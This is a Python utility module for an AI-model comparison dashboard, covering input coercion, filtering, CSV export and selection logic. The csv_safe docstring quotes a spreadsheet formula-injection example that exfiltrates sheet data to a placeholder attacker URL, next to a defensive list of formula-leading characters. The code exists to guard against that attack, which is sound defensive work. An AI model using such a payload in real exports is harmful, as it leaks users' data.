"""Pure, dash-free helpers shared by app.py, static_api.py, build_static.py.
Imports only stdlib + pandas so this module loads under Pyodide."""
import math
import re
import pandas as pd

from components.charts.constants import canonical_provider


def coerce_number(value, default: float, minimum: float | None = None) -> float:
    """Read a number the user typed, distinguishing 0 from "left blank".

    Every numeric input used `float(value or DEFAULT)`, and 0 is falsy — so
    typing 0 silently produced the default. A 0-token budget priced 1M tokens,
    0 GB of VRAM selected a whole GPU's worth of "models that fit", and the
    Agent Stack recommended a 21 GB model for a stated 0 GB.

    Only None, "" or an unparseable value means "not given". `minimum` clamps
    hostile input: the Budget box's HTML `min` attribute is a validation hint,
    not a guard, so a negative volume reached the cost model and its ascending
    sort put the most expensive model under a callout reading CHEAPEST.

    NaN and infinity count as unparseable. They must take the `default` branch,
    not the clamp: `max(0.0, nan)` is `nan` — NaN compares False against
    everything — so a NaN bandwidth used to become 0 GB/s and every model on the
    Local tab read 0 tok/s, defeating the very default it was paired with. And
    `max(1, inf)` is `inf`, which raises OverflowError on the int() that follows,
    or serialises as the literal `Infinity`, which JSON.parse rejects.

    The blank test sits inside the guard because it is not total: `pd.NA == ""`
    returns NA, and bool(NA) raises.
    """
    try:
        out = float(default) if value is None or value == "" else float(value)
    except (TypeError, ValueError):
        out = float(default)
    if not math.isfinite(out):
        out = float(default)
    return out if minimum is None else max(float(minimum), out)


def apply_filters(df, providers, min_quality, search: str = "",
                  effort: str | None = None) -> pd.DataFrame:
    """Global PROVIDER / MIN SCORE / SEARCH filter, shared by both renderings.

    `providers` is falsy-means-all here, and that is deliberate — this backs a
    multi-select whose placeholder literally reads "All providers", so an empty
    box is the unfiltered state. The Agent Stack's `select_stack` uses the
    opposite rule (`[]` means none) because it backs *checkboxes*, where every
    box unticked is an explicit choice. Two controls, two idioms; the rule is
    pinned by tests on both sides so the asymmetry stays deliberate.

    Names are canonicalised on both sides of the comparison so a retired
    spelling still selects: an `?p=xAI` link shared before Artificial Analysis
    renamed the provider matched zero rows and silently rendered the entire
    catalogue.

    `effort` selects WHICH reasoning-effort variant represents each model; it
    does not filter rows out. Default None keeps every variant, which is what
    every caller saw before the control existed, so an untouched dashboard shows
    exactly what it always did. See components.charts.constants.select_effort.
    """
    filtered = df.copy()
    if effort:
        from components.charts.constants import select_effort
        filtered = select_effort(filtered, None if effort == "best" else effort)
    if providers:
        wanted = {canonical_provider(str(p)) for p in providers}
        filtered = filtered[
            filtered["provider"].astype(str).map(canonical_provider).isin(wanted)
        ]
    if min_quality and float(min_quality) > 0:
        filtered = filtered[filtered["quality"] >= float(min_quality)]
    if search and search.strip():
        # Escape user input so characters like (, [, * are treated as
        # plain text rather than regex metacharacters.
        pat = re.escape(search.strip())
        mask = (
            filtered["model"].str.contains(pat, case=False, na=False) |
            filtered["provider"].str.contains(pat, case=False, na=False)
        )
        filtered = filtered[mask]
    return filtered


COMPARE_MAX = 5

# Characters that make a spreadsheet treat a cell as a formula rather than text.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(df):
    """Neutralise leading formula characters in text cells.

    `to_csv` quotes for delimiters, and quoting does not stop Excel or Sheets
    evaluating a cell that begins with `=`. The export is handed to the browser
    as `ai_frontier_export.csv` — a filename that invites a spreadsheet — so a
    scraped model name of `=IMPORTXML("https://attacker/?"&A1,"//a")` would run
    on open and exfiltrate the sheet, with nothing on screen to suggest the name
    was a formula.

    Applied on export AND on the way into data/raw/*.csv, which the bot commits
    hourly. The feed is clean today (0 cells starting `= + - @ \\t \\r`); this is
    a choke point, not a reaction.
    """
    def _clean(v):
        if not isinstance(v, str):
            return v
        # Collapse embedded newlines and tabs first. A prefix does not help if
        # the cell can end the record: a \r inside a quoted field still starts a
        # new row in some readers, and the continuation line is then unprefixed.
        v = v.replace("\r\n", " ").replace("\r", " ").replace("\n", " ").replace("\t", " ")
        return "'" + v if v[:1] in _FORMULA_LEAD else v

    out = df.copy()
    for col in out.columns:
        if out[col].dtype == object:
            out[col] = out[col].map(_clean)
    return out

_QUALITY_LADDER = [0, 10, 15, 20, 25, 30, 35, 40, 45, 50]


def quality_options(p75: float | None = None, p90: float | None = None) -> list[dict]:
    """MIN SCORE options, including the exact percentiles the presets set.

    One value had four incompatible representations. The presets wrote 42.1 and
    52.7 into a dropdown whose options were a round ladder, so:
      - Dash's control went visually blank (no matching option),
      - the static site snapped 52.7 down to 50, making "Top 10%" return 15.5%
        of the catalogue under a label that is a precise numeric claim,
      - `?q=42.1` hit `int("42.1")`, raised, was swallowed, and became 0 — the
        filter silently dropped, so a shared "Top 25%" link showed 11 models as
        the top quartile when only 8 qualified.

    Carrying the percentiles as real options makes the control able to hold what
    the buttons set, and labels them so the number is not a mystery.
    """
    entries = {float(v): f"≥ {v:g}" for v in _QUALITY_LADDER}
    for value, note in ((p75, "top 25%"), (p90, "top 10%")):
        if value is not None and float(value) > 0:
            entries[float(value)] = f"≥ {float(value):g}  ·  {note}"
    return [{"label": entries[v], "value": v} for v in sorted(entries)]

# Tabs that read none of PROVIDER / MIN SCORE / SEARCH. The global filter bar is
# rendered outside the tab container in both renderings, so it stayed visible
# and live over content it did not touch: on ?tab=image&p=Anthropic&q=45 the bar
# read "Anthropic · ≥ 45" above a chart plotting 72 models from a dozen other
# providers.
TABS_WITHOUT_GLOBAL_FILTERS = ("recommend", "local", "image", "video")

# What ↓CSV should hand you on each tab. Exporting the hosted-LLM catalogue from
# the Image Gen tab produced a file with the LLM header and seven text models —
# a different dataset from the one on screen.
_TAB_EXPORTS = {
    "local": ("ai_frontier_local_models.csv", "local"),
    "image": ("ai_frontier_image_models.csv", "image"),
    "video": ("ai_frontier_video_models.csv", "video"),
}


def export_frame_for_tab(tab, full_df, providers, min_quality, search):
    """(DataFrame, filename) for the dataset the given tab is showing.

    The three non-LLM tabs export their own catalogue unfiltered, because the
    global filters they would otherwise be filtered by are hidden there.
    """
    name, kind = _TAB_EXPORTS.get(tab or "", ("ai_frontier_export.csv", "llm"))
    if kind == "local":
        from data.local_models import get_local_df
        return get_local_df(), name
    if kind == "image":
        from data.image_models import get_image_df
        return get_image_df(), name
    if kind == "video":
        # The RAW catalogue, not the projected view: both arenas, both prices,
        # every per-category Elo, and the superseded builds the tab hides behind
        # is_current. The export is where someone checks the dashboard's work,
        # so it must carry more than the screen does, not less.
        from data.video_models import get_video_df, load_raw
        raw = load_raw()
        return (get_video_df() if raw is None or raw.empty else raw), name
    return apply_filters(full_df, providers, min_quality, search or ""), name


def cap_compare_selection(selected_models, filtered_df, triggered=None) -> list[str]:
    """The Compare tab's selection, pruned to what still fits — never discarded.

    Two bugs, one cause: the selection was *replaced* with the diverse-5
    defaults rather than filtered.

    (a) Any global filter change reset it, even for models that still passed.
        A curated three-model comparison vanished on one click of "Top 25%"
        while every one of the three still cleared the new floor, and clearing
        the filter did not bring them back.
    (b) On the static site every tab switch routed through the same path, so
        going to Table and back replaced the selection too. Dash has no `tabs`
        input on this callback and never did it — pure drift, which is why
        `triggered` must distinguish a real filter change from a re-render.

    The cap evicts the OLDEST pick, not the newest: `[:5]` threw away the model
    the user had just clicked, which reads as the click doing nothing.
    """
    available = set(filtered_df["model"]) if filtered_df is not None and len(filtered_df) else set()
    kept = [m for m in (selected_models or []) if m in available]

    if triggered in ("filter-provider", "filter-quality", "model-search"):
        # A real filter change: keep whatever still qualifies, and only fall
        # back to the defaults when the filter has excluded everything.
        return kept[-COMPARE_MAX:] if kept else compute_diverse5(filtered_df)

    if triggered == "radar-model-select" and not (selected_models or []):
        # The user emptied the control themselves. Returning the defaults here
        # charted five models while the raw-values table beneath went blank —
        # the chart and the table disagreeing about what was being compared,
        # with the <select> visibly empty. An explicit clear stays cleared.
        return []

    if not kept:
        # No selection yet (first paint, or a re-render with nothing chosen).
        return compute_diverse5(filtered_df)
    return kept[-COMPARE_MAX:]


def compute_diverse5(dataframe: pd.DataFrame) -> list[str]:
    """Pick 5 diverse models spanning quality, value, speed, and budget tiers."""
    valid = dataframe[(dataframe["quality"] > 0) & (dataframe["price"] > 0)].copy()
    if valid.empty:
        return []
    picks: list = []

    def _add(rows):
        for _, row in rows.iterrows():
            if row["model"] not in picks:
                picks.append(row["model"])
                return

    # 1. Best intelligence
    _add(valid.sort_values("quality", ascending=False))
    # 2. Best value (quality/price) with a quality floor so weak-but-cheap
    #    models don't monopolise the "value" pick in Compare defaults.
    v = valid[valid["quality"] >= 35].copy()
    v["_val"] = v["quality"] / v["price"]
    _add(v.sort_values("_val", ascending=False) if not v.empty else valid.assign(_val=valid["quality"]/valid["price"]).sort_values("_val", ascending=False))
    # 3. Fastest model with quality >= 40
    fast = valid[(valid["speed"] > 0) & (valid["quality"] >= 40)]
    _add(fast.sort_values("speed", ascending=False) if not fast.empty else valid.sort_values("speed", ascending=False))
    # 4. Cheapest with quality >= 50
    cheap = valid[valid["quality"] >= 50]
    _add(cheap.sort_values("price") if not cheap.empty else valid.sort_values("price"))
    # 5. Mid-tier (40-70 quality range)
    mid = valid[(valid["quality"] >= 40) & (valid["quality"] <= 70)]
    _add(mid.sort_values("quality", ascending=False) if not mid.empty else valid.sort_values("quality", ascending=False))

    return picks[:5]


def ctx_to_k(c) -> float | None:
    """Convert context string ('400k', '1m', '128k') to numeric thousands for sorting."""
    if not c:
        return None
    s = str(c).strip().lower()
    try:
        if s.endswith('m'):
            return float(s[:-1]) * 1000
        if s.endswith('k'):
            return float(s[:-1])
        return float(s) / 1000
    except ValueError:
        return None


def quality_label(pct: float) -> str:
    """pct is quality normalised to 0–100 relative to the dataset max."""
    if pct >= 90: return "Exceptional"
    if pct >= 75: return "Strong"
    if pct >= 55: return "Capable"
    if pct >= 35: return "Average"
    return "Limited"


def provider_options(dataframe: pd.DataFrame) -> list:
    return [{"label": p, "value": p} for p in sorted(dataframe["provider"].unique())]


def model_options(dataframe: pd.DataFrame) -> list:
    top = dataframe[dataframe["quality"] > 0].sort_values("quality", ascending=False)
    return [{"label": f"{r['model']} ({r['provider']})", "value": r["model"]}
            for _, r in top.iterrows()]


def ranking_frame(df):
    """The hosted catalogue plus the open-weight models nobody sells.

    One definition, called by app.py, static_api.py and build_static.py, because
    a leaderboard that differs between the Dash app and the published site is
    the drift this module exists to prevent.

    Only the RANKINGS view uses this. Overview, Landscape and the rest stay on
    the hosted frame: their axes are price and speed, and these rows have
    neither. See data.local_models.unhosted_ranking_rows for why that is a
    property of the data rather than a gap in it.
    """
    import pandas as pd

    try:
        from data.local_models import unhosted_ranking_rows
        extra = unhosted_ranking_rows(set(df["model"].astype(str)))
    except Exception:
        return df                      # a ranking is better than an exception
    if extra is None or extra.empty:
        return df
    merged = pd.concat([df, extra], ignore_index=True)
    if "self_host" in merged.columns:
        # .eq(True) rather than .fillna(False).astype(bool): concat leaves the
        # hosted rows NaN in an object column, and fillna+astype on that emits a
        # pandas downcasting FutureWarning. NaN.eq(True) is already False.
        merged["self_host"] = merged["self_host"].eq(True)
    return merged


def effort_options() -> list[dict]:
    """Options for the EFFORT control, shipped in the manifest.

    "All variants" is first and is the default, so the dashboard an untouched
    visitor sees is the one it has always been — the Table in particular
    promises "every tracked model" and must not quietly collapse. Choosing
    anything else selects one row per model.
    """
    from components.charts.constants import EFFORT_LEVELS

    return (
        [{"label": "All variants", "value": ""},
         {"label": "Best available", "value": "best"}]
        + [{"label": label, "value": slug} for slug, label in EFFORT_LEVELS]
    )
